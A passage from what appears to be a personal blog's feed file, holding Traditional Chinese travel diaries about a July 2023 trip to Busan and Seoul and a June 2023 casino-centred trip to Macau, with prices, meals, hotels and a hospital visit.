真的很不錯。如果去首爾的話，多留幾天在松島也不錯，下次想住 Oakwood Premier，就是那個很高的飯店，景觀應該超讚的。</p><p>或去其他城市看看好像也不錯？也想住住看韓屋，應該都會是滿特別的體驗。</p><p>以上就是這次韓國十天九夜釜山首爾之旅的心得，短期內應該不會再出國了…吧。</p>]]></content>
      
      
      <categories>
          
          <category> 旅遊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旅遊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 年 7 月南韓十日遊心得：釜山篇</title>
      <link href="/2023/07/27/2023-july-korea-trip-busan-a475e484e1fc/"/>
      <url>/2023/07/27/2023-july-korea-trip-busan-a475e484e1fc/</url>
      
        <content type="html"><![CDATA[<p>事情是這樣的，六月去完澳門之後，想說短期內應該不會再出國了吧，但有天在 YouTube 上看見了這支影片：</p><p>簡單來說就是她買到了特價的虎航機票來回 4000 元，然後住宿一天一個人大概只要 700 塊，於是六天五夜機加酒就是 7500 塊，聽起來超級便宜。再來，影片裡面出現的東西看起來都滿好吃的，讓我動起了想去韓國的念頭。</p><p>在疫情之前我去過韓國，而且是一次玩了釜山、大邱跟首爾，在韓國待了兩週，那時沒有寫下太多的心得，只寫了這篇：<a href="/2019/10/31/travel-part2-818482a90bc9/">《旅行的意義（下）：寫在遊阿布達比、歐洲與韓國後》</a>，但我是喜歡去韓國玩的。</p><p>而我太太也因為員工旅遊的緣故去過首爾幾天，對她來說韓國沒什麼吸引人的地方，去了以後沒什麼感覺。於是我就想說：「好，讓她感受一下釜山跟首爾其實也是好玩又好吃」，這趟旅程就成行了。</p><p>一共去了韓國十天九夜，前五天在釜山，後五天在首爾，機票的話也是直接買釜山進首爾出，這樣兩個地方都可以玩到。</p><p>底下一樣以流水帳的形式紀錄每一天的行程跟花費，最後做個總結。因為內容有點長所以會分兩篇，這篇是釜山篇，下一篇是首爾篇。</p><h3 id="Day1：出師不利，雨雨雨的釜山"><a href="#Day1：出師不利，雨雨雨的釜山" class="headerlink" title="Day1：出師不利，雨雨雨的釜山"></a>Day1：出師不利，雨雨雨的釜山</h3><p>我們是搭乘早上大韓航空的飛機前往釜山，大概下午三點的時候抵達，抵達以後先去機場換了釜山必備的 Visit Busan Pass，可以憑這個去多個點免費入場，還可以拿來當作韓國悠遊卡搭乘捷運跟公車。</p><p>到釜山的時候天氣很差，一直下雨，直接搭捷運到住宿的地方海雲台也是繼續下，而且愈下愈大，絲毫沒有要停的跡象。於是我就直接到便利商店買了一把大傘，不然兩個人只撐一把摺疊傘太苦了。</p><p>幸好飯店離的跟捷運站很近，走個三分鐘就到了。但儘管只有三分鐘，鞋子還是濕了，褲子下半部也差不多全濕了。沒錯，雨就是這麼大。</p><p>這三天的住宿在開頭影片中提到的 <a href="https://goo.gl/maps/yZ5nLmL4742fc5vDA">Show hotel</a>，三個晚上的雙人房是 3757 台幣，一個晚上只要 1250 元，真的是很便宜了。但住起來的感覺不太推薦，我自己覺得有點太舊太暗，下次有機會會願意提高個兩三成的預算找更好的房間。</p><p>放完行李以後雨有變小一點，去附近吃了知名的<a href="https://goo.gl/maps/x8fWGwfK1awtGuMG7">密陽血腸豬肉湯飯</a>，味道還不錯，韓國的這種湯飯基本上沒什麼調味，需要自己去調整，喜歡吃清淡的也可以直接不調。</p><p><img src="/img/2023-july-korea-trip-busan-a475e484e1fc/1__zbXhooi9G6__s9ocBCbkaig.jpeg"></p><p>一碗的價格是 10000 韓元，折合台幣約 245 元。</p><p>話說這次去韓國，差不多在外面吃飯一餐平均就是一萬韓元，便宜的或許可以到 7000 左右，折合台幣 170 元，跟之前去日本旅遊得到的心得是滿相近的，不過日本有吉野家或是松屋這些可以降低成本，韓國似乎比較沒看到這種類型的連鎖韓食速食店？</p><p>吃完之後去海邊散步一下，整片都霧濛濛的：</p><p><img src="/img/2023-july-korea-trip-busan-a475e484e1fc/1__uBaxsV6DbiffhKmO2pamSA.jpeg"></p><p>因為下雨的關係所以之後就先回飯店休息了，晚上的話也沒有再出來，結束了第一天。</p><h3 id="Day2：一天當兩天用"><a href="#Day2：一天當兩天用" class="headerlink" title="Day2：一天當兩天用"></a>Day2：一天當兩天用</h3><p>根據天氣預報，釜山這一週只有今天是陰天，其他天都是雨天。經歷過了昨天的下雨洗禮之後，決定今天趕快把想去的地方都去一去，避免後天因為下雨哪裡都去不了。</p><p>早上散步到搭乘膠囊列車的地方，已經先在網路上預訂好，不過到現場還是要排個半小時左右：</p><p><img src="/img/2023-july-korea-trip-busan-a475e484e1fc/1__cShb7Rb4IXF55esj__Bgf6w.jpeg"></p><p>這個列車要搭個半小時左右，會夯是因為路線很棒，在搭乘的時候旁邊就直接是海景：</p><p><img src="/img/2023-july-korea-trip-busan-a475e484e1fc/1__66Mjvv3SV0UWWGX3WCPn0Q.jpeg"></p><p>兩站的距離大約 20 至 30 分鐘左右，前半段都是無敵海景，後半段會是樹林，體驗還是滿不錯的。到了下一站之後用 VBP(Visit Busan Pass) 換免費的票，搭乘另一種「海岸列車」。</p><p>海岸列車沒有拍照，但簡單來說膠囊列車是在二樓看海景，海岸列車就是在一樓。一樣看得到海，只是變成是像火車那種車體而已，不過特別的是座椅全部都是面海的。</p><p>午餐的話吃了網路上找到的釜飯，但重點其實不是釜飯本身，而是一大堆的小菜：</p><p><img src="/img/2023-july-korea-trip-busan-a475e484e1fc/1__8akWgrqSFVrKRm0TRS__4QA.jpeg"></p><p>全部這樣配著吃真的滿滿足的，釜飯的話是海鮮的，裡面有鮑魚什麼的，一個人是 18000 韓幣，折合台幣 440 元。</p><p>吃完之後直接搭公車到附近的 Skyline Luge 玩滑車，會先坐一個像是滑雪場的那種纜車上山，再坐滑車下來，操作簡單滿好玩的，用 VBP 可以免費玩兩次，但我們玩了一次之後就把票給其他台灣人，跑去下一個地方了。</p><p>下一個點是樂天世界，就在旁邊而已，但是走過去也要個 15 分鐘左右，那天早上雖然陰陰的但是下午直接大太陽，靠北熱，天氣 app 寫說什麼 30 度，但是體感大概跟台北那時候差不多熱了。</p><p><img src="/img/2023-july-korea-trip-busan-a475e484e1fc/1__hikp65wvQc0gvXvNLEg__8A.jpeg"></p><p>釜山樂天世界是去年才新開的遊樂園，如果你沒有帶小孩，也不敢玩刺激的遊樂設施的話，我建議其實是可以不用去。園區比想像中的再小一點，滿快就可以走完一圈，遊樂設施也不多。</p><p>那邊主要的幾個遊樂設施都是很刺激的那種，像是雲霄飛車，另外有一兩個是玩水的，從上面衝下來會濕掉的那種，因為我們這兩種都不想玩，所以最後只玩了兒童版的雲霄飛車。</p><p>在遊樂園大概待一兩個小時以後，原本其實應該是要搭公車回青沙浦，然後搭海岸列車回程，但因為實在是太熱了，所以直接叫計程車回去，到了今天最後一個景點：釜山 X the SKY，是韓國第二高的建築，高度是 411 公尺，而台北 101 高度是 508 公尺，觀景台則在 382 公尺，所以我也不知道以觀景台來說到底哪個比較高。</p><p>有個很棒的地方是搭電梯上樓時，整個電梯四周都是螢幕，會有精心製作的動畫，例如說上樓的話會是熱氣球上升什麼的，隨著高度變化景色跟內容也會變，就不會覺得搭電梯的時候很無聊。</p><p>上去以後覺得真的超高，晚上來應該滿漂亮的，但因為晚上有其他行程所以才改成中午來。</p><p><img src="/img/2023-july-korea-trip-busan-a475e484e1fc/1__lO22gfya3eOuhPnPvDbciw.jpeg"></p><p>還有一個沒拍的是他有透明的走廊，說實在的不太敢往下看，100 樓真的太高…</p><p>逛完之後在 99 樓有全世界最高的星巴克，可以去買杯飲料朝聖一下。</p><p>看完回飯店休息一下之後，晚餐吃了很期待的味讚王鹽烤肉，是有人幫烤的韓式烤肉，最少要點三人份。不過吃了之後發現其實份量不算多，所以三人份完全沒問題，甚至點到四人五人份我覺得都可以。</p><p>晚餐的部分點了三份肉外加一個冷麵，花了 5 萬韓元，台幣 1225 元，一個人 600 塊好像也不貴。</p><p>吃完之後就去今天最後一個行程：鑽石灣遊艇，也是包含在 VBP 的免費景點裡面，就是搭船帶你到海上繞一圈看夜景還有廣安大橋。</p><p>遊艇比想像中的大，而且人還不少，大概有四十個人左右，整個航程大概一小時多，我覺得滿推薦的，我們是約晚上 8:30 的場次，很漂亮。</p><p><img src="/img/2023-july-korea-trip-busan-a475e484e1fc/1__SFHu__IKy1xfODaW1a__tYyw.jpeg"></p><h3 id="Day3：百貨公司逛到飽"><a href="#Day3：百貨公司逛到飽" class="headerlink" title="Day3：百貨公司逛到飽"></a>Day3：百貨公司逛到飽</h3><p>第三天跟預期的一樣是個下雨天，中午接近吃飯時間時去了新世界百貨公司逛，不知道要吃什麼的時候發現有間餐廳人特別多，靠近一看才發現是地獄廚房 Gordon Ramsay 開的漢堡店，就進去嚐鮮了。</p><p>點了凱薩沙拉 + 薯條 + 一個漢堡分著吃，總共是 61000 韓元，約 1500 台幣。</p><p><img src="/img/2023-july-korea-trip-busan-a475e484e1fc/1__MfqrBh4njwqtQ2x6Q1We7Q.jpeg"></p><p>凱薩沙拉的菜跟以前吃過的不同，有點苦苦的，不確定是什麼葉子，雞肉的話還不錯。薯條的話很明顯可以吃出馬鈴薯的原味，滿紮實的很有飽足感。</p><p>至於眾所矚目的漢堡：</p><p><img src="/img/2023-july-korea-trip-busan-a475e484e1fc/1__N__xerVd26FX79lhFrKaHSg.jpeg"></p><p>我只能說那個肉是真的好吃，而麵包本身有用奶油之類的去煎過，超級香，整個漢堡的表現都很不錯，難怪這麼多人來吃。</p><p>下午就繼續在那邊逛，逛完回飯店休息，晚上買了附近的 Egg drop，花了 11000 而已，台幣 270 元，算是這趟旅程吃得最便宜的一餐。</p><p>這天因為下雨所以整天基本上就是逛百貨公司跟飯店休息睡覺。</p><h3 id="Day4：換地方囉"><a href="#Day4：換地方囉" class="headerlink" title="Day4：換地方囉"></a>Day4：換地方囉</h3><p>這天早上先去附近 Google Maps 找到的自助洗衣店洗衣服，是外國人友善的店，裡面有貼英文的標示，投幣的話沒什麼問題。</p><p>但如果要用自助機器加信用卡結帳的話，介面是韓文的，剛好店長走進來就順便問了一下怎麼操作，順利用信用卡付錢，洗加烘差不多要個 1 萬韓幣左右，折合台幣 250，是有點小貴。</p><p>還有碰到一個從丹麥來的外國人也要洗衣服但不會操作，就幫了他一下順便小聊，他說他從首爾下來的，隔天要搭船去九州玩，接著一路往上到京都再到東京。很巧的是他在台灣待過兩年左右，他說他做的是 container shipping，聽的時候不知道是什麼，後來去查才恍然大悟原來 container 就是貨櫃。</p><p>洗完衣服之後差不多中午了，退房之後先搭車去新的住宿，住的一樣是開頭影片提過的 <a href="https://goo.gl/maps/Ur4385TaudPjhem48">Maron Hotel</a>，兩天是 2757 元，一天 1378 元，也是很划算，而且房間裡面還有超大的電視，可以看 YouTube 跟 Netflix，很適合下雨天。</p><p>中午隨便吃附近百貨公司的美食街日式拉麵，味道不錯，價格的話是一碗 10000 韓元，約台幣 245 元。</p><p><img src="/img/2023-july-korea-trip-busan-a475e484e1fc/1__2Brmrttc6UGfKja3__R2BBw.jpeg"></p><p>下午在飯店睡覺滑手機看 YouTube，看看韓國人都在看什麼，發現一直被推薦這個韓國大胃王，有著 800 萬訂閱，超猛：<a href="https://www.youtube.com/@tzuyang6145">https://www.youtube.com/@tzuyang6145</a></p><p>晚上的話吃了附近的這個豆腐鍋，小小碗的但是價格也相對便宜，一碗是 7000 韓元，170 台幣：</p><p><img src="/img/2023-july-korea-trip-busan-a475e484e1fc/1__I9ugLLJBt2DIJ0Sb3w0TDQ.jpeg"></p><p>吃完之後去附近散步走走，因為住的地方離釜山塔很近，就順便上去看一下了。入場門票一個人要將近 300 台幣，那邊有自助機器可以直接購票，直接講結論：不推薦。</p><p>原因是釜山塔的景色普通（可能是不夠高，周遭東西也不夠多），而且有點小，可以待的時間比較少，所以我自己是覺得可以不用特地上去。</p><p><img src="/img/2023-july-korea-trip-busan-a475e484e1fc/1__pULljKiFxUjx5X6jThdtsg.jpeg"><br><img src="/img/2023-july-korea-trip-busan-a475e484e1fc/1__EhgHlHjxXczuIinF__BofAQ.jpeg"></p><h3 id="Day5：韓國看醫生初體驗"><a href="#Day5：韓國看醫生初體驗" class="headerlink" title="Day5：韓國看醫生初體驗"></a>Day5：韓國看醫生初體驗</h3><p>從小的時候開始，我就有異位性皮膚炎，也就是俗稱的濕疹，但狀況就是時好時壞，原本以為長大之後會自己好，沒想到似乎變得越來越糟。在五月離職之後本來想說沒了工作壓力之後應該會好轉，結果不知道為什麼變得更嚴重了，就皮膚紅得很明顯然後會脫屑，還滿麻煩的。</p><p>吃個一陣子類固醇之後不想繼續吃，轉而投入中醫的懷抱開始吃中藥，就在這樣的狀況下去了韓國旅遊。去旅遊的頭兩天就覺得雙腳大腿靠近膝蓋的位子腫腫痛痛的，但不以為意，想說可能是水腫或是濕疹的關係，直到第三天才察覺到：「靠邀，這該不會就是俗稱的蜂窩性組織炎吧」，因此上網當個鍵盤醫生找了一堆資料。</p><p>根據我自己的評估，就算是的話狀況應該也不嚴重，原因是：</p><ol><li>沒有傷口</li><li>沒有全身性的症狀</li><li>似乎有在好轉</li></ol><p>但是在前一兩天其實有覺得快要發燒，而且明顯比平常怕冷（不知道是皮膚的關係還是別的原因），為了安全起見，還是決定在韓國看個醫生。</p><p>直接在網路上搜尋「釜山 外國人 看病」就會出現釜山大學醫院，他們有專門設立一個外國人門診專區，而且有會講中文的護士，於是隔天早上就直接殺去醫院。</p><p>意外地，外國人專區只有我一個人，簡單說明來意以後就出現了傳說中的會講中文的護士，稍微問了一下我的狀況。等了一些時間之後，她說現在整形科跟感染科的醫生都在罷工（有興趣的可以自己去查新聞，韓國部分醫生最近正在罷工抗議新的醫療法案什麼的），只剩下皮膚科可以看，但要等到下午 1:30（我去的時候是 9:30），請我下午再來。</p><p>於是我就先回飯店休息一下，時間差不多的時候出來吃個飯，吃完飯散步回醫院。</p><p>回去之後先在那邊付錢掛號，掛號費大約是 1000 台幣，接著護士帶我到皮膚科抽號碼牌，等的人不多，等了大概十分鐘就進去診間了。進去診間的時候護士一樣都會全程幫忙翻譯，在等待的時候我也有先說明一下自己的狀況以節省時間。</p><p>總之呢，結論就是應該是輕微的蜂窩性組織炎，要打一針抗生素，皮膚的部分也要打一針類固醇，除此之外還要吃一週的抗生素加類固醇。</p><p>雖然說一開始我不太想吃類固醇，但醫生說現在皮膚都是急性發炎的狀態，吃一下比較好，我想想也滿有道理，雖然有點擔心停藥之後復發，但如果抗生素起了作用可是皮膚沒好又再次感染就麻煩了。</p><p>看完之後就先去付錢，打針的部分價錢出乎意料，只要 170 台幣，藥的話一週的類固醇 + 一週的抗生素 + 兩週的抗組織胺 + 一罐低類固醇乳液 &#x3D; 1070 元。</p><p>付完錢就去打針了，類固醇是打在接近屁股那裡，護士有先講會痛，還真的滿痛的，而抗生素的話要先打一點確認不會過敏，等了 15 分鐘之後打在手臂的血管上。</p><p>打完針之後最後一關是拿藥，韓國醫院似乎比較多都是去附近的藥房拿藥，不像台灣是在醫院裡面就可以拿。於是就跑去附近的藥房等了一下，這時候一樣是有護士陪同，拿到藥之後還很貼心地在藥上面幫我用中文寫什麼時候吃，吃幾天之類的，而藥單上面也特別寫下了英文藥名，讓我知道自己吃了什麼。</p><p>整個體驗都滿不錯的，重點是護士的貼心服務，從頭到尾陪同翻譯，在國外生病的時候有一個能講中文的護士陪同真的很棒，在 Google Maps 上的中文評論也都是在稱讚這個護士，實至名歸。</p><p>而價格的話看診打針拿藥，總共花了大概 2250 元台幣，在沒有任何醫療保險的狀況下，我覺得是很能接受的價格。</p><p>以上就是去釜山大學醫院看病的過程，總共花了大約一個小時，如果大家未來去釜山需要看病的話，可以考慮釜山大學醫院。</p><p>至於後續的話，打了針吃抗生素吃個幾天之後狀況就好多了，大腿也不腫了，一切正常，後續就放心地在韓國繼續玩了，感謝釜山大學醫院的努力，平安度過了一週。</p><p>最後補一下這天的飲食。</p><p>這天中午吃的是附近富平豬腳街的弘小豬腳，點了涼拌跟一般各半，再搭配兩碗白飯，總共是 41000 韓元，台幣 1000 塊。會點涼拌是因為網路上的評價都說涼拌比較特別，一般的還好，但我自己吃過之後其實比較喜歡一般的，他是把豬腳切片，那是真的好吃，涼拌的就沒這麼喜歡。</p><p>傍晚的話就去附近走走，離海邊很近真棒，隨時都可以去海邊或是河邊晃晃：</p><p><img src="/img/2023-july-korea-trip-busan-a475e484e1fc/1__TSaZdRsrO7xBh28HzJ1yTw.jpeg"></p><p>回程的時候還買了一根熱狗，每次看韓綜都覺得熱狗很吸引人，實際吃也是覺得好吃，但店家是全韓文的沒有英文菜單，要自己拿翻譯出來翻一下才知道點什麼：</p><p><img src="/img/2023-july-korea-trip-busan-a475e484e1fc/1__FKqN7p9gVm6Cs5__1V__0knw.jpeg"></p><p>然後那個包裝真的是畫龍點睛，熱狗吃一吃之後可以用包裝把熱狗往前推，就不用自己用嘴巴咬出來。</p><p>晚餐的話就隨便吃飯店附近的漢堡店，點了一個套餐分著吃，味道還不錯，價格也可以接受，漢堡 + 薯條 + 飲料是 10000 韓元，折合台幣 245 。</p><p>釜山的部分差不多到這邊就結束了，隔天就會搭韓國高鐵 KTX 從釜山到首爾，進行下一段的旅程，因此這邊先幫釜山做個總結。</p><p>看起來夏天是個不太適合去釜山玩的天氣，原因是要嘛下雨要嘛很熱，沒辦法感受到海的美麗還有釜山的愜意。</p><p>我上次去的時候是十月份秋天，天氣涼涼的很舒服又不至於到太冷，而且沒什麼下雨，看來出國旅遊天氣還是個很重要的因素，碰到連續幾天都下大雨的話真的是沒什麼出門玩的心情，會嚴重影響到行程跟開心程度。</p><p>但整體而言我還是滿喜歡釜山的，而且會願意再次拜訪，無論是那些景點或是食物我都覺得很不錯。雖然說不是每間的泡菜我都喜歡，但是吃飯的時候固定會有不少韓式小菜可以配，我就是很喜歡這個感覺。</p><p>下集傳送門：<a href="/2023/07/27/2023-july-korea-trip-seoul-92ba2d0608ff/">2023 年 7 月南韓十日遊心得：首爾篇</a></p>]]></content>
      
      
      <categories>
          
          <category> 旅遊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旅遊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 年 6 月澳門三天兩夜小旅遊心得</title>
      <link href="/2023/07/01/2023-06-macau-travel-venetian-21687588b87d/"/>
      <url>/2023/07/01/2023-06-macau-travel-venetian-21687588b87d/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/2023-06-macau-travel-venetian-21687588b87d/1__5mqry9YbM__TOf0Mb70gRgQ.jpeg"></p><p>因為要保持星宇航空會籍的關係，今年一定要再飛一次來回，而最省錢也最快的航點就非澳門莫屬了。</p><p>平日早去晚回的機票，兩個人大約 12k，一個人 6k 其實滿便宜的。</p><p><img src="/img/2023-06-macau-travel-venetian-21687588b87d/1__MtdxpUnIUCW3jMNBwFjcpw.jpeg"></p><p>雖然說飛不到兩小時就到了，但一樣有飛機餐可以吃，菜色如上，主餐漢堡排 + 水果 + 一杯小果汁鋁箔包（沒拍到） + 巧克力米果（沒拍到），味道還不錯，不過我好像已經吃這個漢堡排第三次了。</p><p>下飛機以後入境的地方不大，但根據時機不同，隊伍長度會有很大的變化。剛好我們是比較空的時段，過了十分鐘以後一堆巴士開進來（因為很多飛機沒有連接航廈，所以旅客是下機之後再搭巴士過來），人瞬間變得超級多。</p><p>順利入境以後就搭免費接駁車前往這三天的住宿：威尼斯人。</p><p>當初原本想說要不要一天住威尼斯人，另一天跑去另一個半島住，後來想想覺得好像很麻煩，還是算了。威尼斯人的價錢是兩個晚上 12000 元不含早餐，我覺得小貴。</p><p>雖然說到達飯店的時候才一點半，不過也可以先去排隊 check-in，排隊的時候會有人來問你要不要辦卡，基本上就是賭場的卡，這個等等再解釋。排到的時候櫃檯說現在就有房，或是也可以等一個半小時可以給我更高樓，就選更高樓了。</p><p>接著就是去附近商場晃晃等房間。</p><p>這次我第二次來澳門了，第一次是 2016 年 7 月，公司的員工旅遊，算算也是七年前了。那時候我的心得文上面寫說：</p><blockquote><p>在這裡親眼見識到澳門的物價，台灣賣 160 的普通餐點，澳門大概賣 80 澳幣，也就是 320 台幣。因此得到這趟旅遊第一個心得：把台灣價格*2，大概就是在澳門要付出的代價</p></blockquote><p>沒想到七年後再去，物價也差不多，一個人吃一餐就差不多 80 澳幣（乘以 4 是台幣），似乎算是好事，並沒有物價飛漲什麼的。</p><p>我們的房間長這樣，就是經典的威尼斯人房間：</p><p><img src="/img/2023-06-macau-travel-venetian-21687588b87d/1__P8Ug543konKAjR5q1x44PQ.jpeg"></p><p>其實整個環境滿舒服的，浴室很大，房間也很大，而且有工作桌可以工作，所有的插座也都是萬國插座不需要轉接頭，唯一的缺點就是床有點短，我 183 公分睡覺的時候腳會在床外。</p><p>放完東西以後，就去樓下開始賭博了。</p><p>這次帶的現金是 300 美金，折合港幣約 2300 左右，這邊去賭場都是收港幣，不是收澳門幣，換錢的時候要注意一下。</p><p>像我這種小賭怡情的，都是選電子機台為主，因為真人的最小賭注都太高了，以威尼斯人來說最小的就要 500 港幣，我玩個兩三注就有可能輸光了，不適合。</p><p>電子機台的話最小一注是 100 港幣，還可以玩久一點。</p><p>然後講回前面的那個會員卡，這邊每一家飯店背後都可能是一個集團，例如說威尼斯人、巴黎人、倫敦人就是金沙集團，這個集團就會有個會員系統，簡單來說就是你賭得越多積分越高，然後「越多」並不是「贏得多」，而是看總共的賭額。</p><p>例如說你贏 100 又輸 100，連續 10 次，總額就是 (100+100) * 10 &#x3D; 2000 元，電子機台似乎要三四千才會有一點積分，湊滿點數就可以去換東西。舉例來說，有些賭場可能 30 分就可以換一個平日晚上的房間，或是 8 分讓你換一份簡單的晚餐之類的。</p><p>我們第一天待在賭場裡面兩三個小時，好像也才打到 5 分左右，什麼都換不到。有些積分是每天結算的，隔天就重新計算了，但也有些可以累積。</p><p>總之呢，第一天我運氣不錯，1000 的本金最後換回 4500 塊，把機票都賺回來了。</p><p>話說這邊幫沒有去過賭場的人簡單介紹一下，進賭場如果你看起來沒有很年輕，也不太會檢查證件，直接讓你進去，有帶包包的話可能需要簡單看一下，然後完全免費，不用錢。</p><p>進去之後有些地方會有飲料吧，都是一些果汁啊，可樂什麼的，都是免費的，直接點下去就對了，路過就可以進去喝個一兩杯。</p><p>要玩的話也很簡單，電子機台直接投鈔票進去就好，賭完要走的時候按結算，就會吐一張券給你上面寫餘額，這張券你可以再丟進機台當籌碼（例如說等等還想來玩），也可以直接兌現。</p><p>像我們這種小額的，旁邊都有機器可以自動兌現，把那張券放進去，就會吐現金給你，拿到現金就可以走人了（不過有些零頭我有碰過沒辦法給的，例如說剩下 3 塊再找一張券給你）</p><p>話說第一天的晚餐是吃商場裡面的 Five Guys，我覺得以澳門物價來說是平價的了，一個普通漢堡大約 70 港幣，小的薯條 40 港幣然後維持一慣的 Five Guys 風格，就是幹你娘加爆，整個紙袋裡面都是薯條。</p><p><img src="/img/2023-06-macau-travel-venetian-21687588b87d/1__BjT2vtzpFIMZuIQhG9ni2g.jpeg"></p><h3 id="Day2：跑來跑去"><a href="#Day2：跑來跑去" class="headerlink" title="Day2：跑來跑去"></a>Day2：跑來跑去</h3><p>第二天早上先跑去官也街晃一下，看到瑪嘉烈蛋撻店沒什麼人排隊就跑去買（昨天看到威尼斯人的隊伍排超級長，至少有三十個人在排）一個蛋塔 11 塊港幣，其實算很便宜的了。</p><p>吃完的感想跟七年前一樣：「肯德基就很好吃了」，而且這是有科學根據的，因為台灣肯德基的蛋塔本來就是買瑪嘉烈的配方。</p><p>接著看附近沒什麼人排隊，順便再點了牛雜，其實味道不錯但是沒白飯配很痛苦，那一碗牛雜超適合配飯的。</p><p>逛得差不多以後，跑回商場去 LadyM 吃蛋糕，台北一片 270 台幣，這邊一片 80 港幣折合台幣約 320 塊，顯得特別便宜，算是平價美食了。</p><p><img src="/img/2023-06-macau-travel-venetian-21687588b87d/1__AayB1sggU__luMEWdcpinGg.jpeg"></p><p>吃完之後再去賭場賭個幾把，然後走去附近的銀河飯店。</p><p>澳門這邊的特點就是飯店一大堆，然後每個都附設賭場。銀河賭場的特別之處在於有免費的珍珠奶茶可以喝，雖然小小杯的，但味道還行。喝個幾杯然後小賭個幾把，讚讚。</p><p>再來還有個特點就是這邊的飯店接駁車很方便，想去哪邊都不需要交通費，搭接駁車就對了。不過最近的接駁車反倒比七年前還少了。我上次來的時候有一個接駁車會經過各大飯店，這次去卻發現沒了。</p><p>以威尼斯人來說，只有去碼頭、機場、關閘跟金沙飯店，沒有去其他非聯盟的飯店。而銀河的話則是有接駁車到另一邊的星際飯店，剛好過去看一看。</p><p>到星際之後一樣先去附近晃晃，去了永利皇宮順便賭了幾把，然後慘劇就發生了。連續開了六把莊以後我開始下閒，輸 100 下 200，輸 200 下 400，以此類推，經典的馬丁格爾策略，結果我下到 1600 還是開莊，就把第一天贏的都輸回去了，直接血虧 3000 港幣，賭博真滴可怕。</p><p>補充一點，之前又提到過威尼斯人電子機台最小一注是 100 港幣，像是永利皇宮跟銀河都有更小的，最低一注 50 塊就可以玩，如果不是單純下莊閒的話，10 塊就可以了，對想小賭的小資族來說比較友善。</p><p>賭場逛的差不多以後，就用走的走去附近大三巴，雖然說是下午四五點不過天氣還是有點熱，可以搭公車的話還是搭公車比較好。在那邊簡單拍個照，順便吃一下義順牛奶公司就又搭接駁車回去了。</p><p>晚上繼續飯店加賭場閒晃行程：</p><p><img src="/img/2023-06-macau-travel-venetian-21687588b87d/1__lOdtCjVj6S__IIdXQROk__mQ.jpeg"></p><p>話說輸了中午那一筆之後我不知道該怎麼玩了，改成追高，一直不斷下同一邊，想說這樣賭到一個四連不就十倍了嗎？結果當然是沒賭到，繼續輸錢。</p><h3 id="Day3：賭，都賭"><a href="#Day3：賭，都賭" class="headerlink" title="Day3：賭，都賭"></a>Day3：賭，都賭</h3><p>這天的飛機是晚上，只要晚上六點到威尼斯人搭接駁車就好，從 11 點退房到晚上 6 點這中間的空窗，怎麼想都是在賭場打發時間最剛好。</p><p>退房以後先去吃了午餐，順便逛了一下附近的商店，發現這邊飲料還真不是普通的貴：</p><p><img src="/img/2023-06-macau-travel-venetian-21687588b87d/1__QeAW9XI4sxbbpfqK8zNduw.jpeg"></p><p>台灣 15 塊的飲料，這邊大概 75 塊，大約是 5 倍的價錢。是台灣的飲料太便宜了嗎？還是去賭場喝免費的最實際，反正你賺他也賺，雙贏。</p><p>雖然說前一天連本帶利輸光了，但其實心態上沒有受到太大影響，畢竟本金總額就是 300 美金，輸光也只輸了不到一萬台幣，賭博的健康心態就是：「拿出你全賠光也不會怎樣的錢來賭」。</p><p>吃完之後繼續殺到威尼斯人賭博，延續昨天的頹勢，把 1500 又輸到了 500，還去玩了幾把拉霸想改運，結果拉霸又沒轉到東西。</p><p>在那邊待了兩三個小時之後，決定去附近晃晃，到了傳說中的米高梅飯店，為什麼是傳說中呢，因為那邊的飲料有珍珠奶茶！而且不只有珍奶，還有珍珠鮮奶！</p><p>沒有拍照，但簡單來說就是小杯的珍珠奶茶，味道很讚，不論是珍奶還是鮮奶，都跟台灣的味道差不多，真的好喝！而為了蹭這三四杯免費的珍奶，我又在那邊輸了 500 塊港幣，不知道可以買幾杯珍奶了。</p><p>逛到最後又回去威尼斯人，因為我太太說她覺得她在那邊手氣比較好，就這樣一路在那邊待到晚上六點，一度快要凹單凹不回來輸光，但很幸運地最後一把凹成功，最後我太太幫我把我輸的都贏回來了，太神辣！</p><p>話說澳門機場滿小的，進去之前有麥當勞可以吃，進去之後也有一兩間餐廳，貴賓室的話只有澳門航空跟環亞，環亞的話有一點點自助跟點餐，餐點份量很多，我點了一個港式的魚蛋米粉就很飽了。</p><p><img src="/img/2023-06-macau-travel-venetian-21687588b87d/1__ATMLYo7b__fL46BjthDAiRQ.jpeg"></p><p>最後做個簡單總結，其實在澳門還是滿有渡假的感覺，因為不是待在百貨商場就是賭場，有冷氣吹有免費飲料喝，如果不考慮輸錢的話，還是滿爽的。</p><p>物價的話倒是真的偏高，不過可以不用排隊吃到一些其他地方需要排隊的東西，感覺還是滿不錯的，例如說 Shake Shack 就沒什麼人在排隊。想省錢的話，飯店其實也可以住更便宜的，反正搭接駁車也很方便，班次也滿多的。</p><p>或是如果覺得自己手氣不錯，吃得住的都可以靠賭博的積分贏來，你甚至最後也不用賺錢，只要一直輸贏輸贏輸贏就可以累積積分，靠積分去換吃的東西或是住宿。不過如果手氣差的，那還是算了，你用真金白銀買還比較划算。</p><p>這次會想來澳門還有一個原因，那就是我去年去了<a href="/2022/08/16/def-con-30-ctf-final-1-79220bba7f02/">真正的賭城拉斯維加斯</a>，那時才發現原來澳門是縮小版的賭城，而真正的賭城原來這麼壯觀，更多浮誇的東西。所以這次想再來一次澳門，看看是不是跟我印象中的一樣。</p><p>結果是一樣的，澳門跟拉斯維加斯相比還是遜色不少，沒有這麼多浮誇的東西，賭博機台也沒這麼多，不過以亞洲來說，澳門應該還是最厲害的了。</p><p>至於賭博的話呢，還是挺可怕的，雖然我前面講過全輸光也不會對經濟有什麼影響，但輸錢心情還是不會太好，而且那種開十二連莊的，你真的會甘願一直加碼下閒，下到沒錢為主。</p><p>雖然說我也知道這些都是錯覺，是賭徒謬誤，但還是會想照著這個策略去下。而且就算贏錢了也不會想收手，看來設個停損點或是停利點還滿重要的，才是真正的有策略在玩。</p><p>總而言之呢，如果你想體驗賭場的氛圍，但又沒辦法跑到美國這麼遠，我覺得先來澳門體驗一下「東方拉斯維加斯」還是滿不錯的，就來個三天兩夜渡個假，雖然消費貴了點但因為待的天數短，所以倒也還好。</p><p>這次兩個人三天兩夜，機票加住宿大概是 24k 左右，吃的話一餐算個 80 港幣，80 * 2 人* 6 餐 * 匯率 4 &#x3D; 4000 台幣，所以總花費大概在 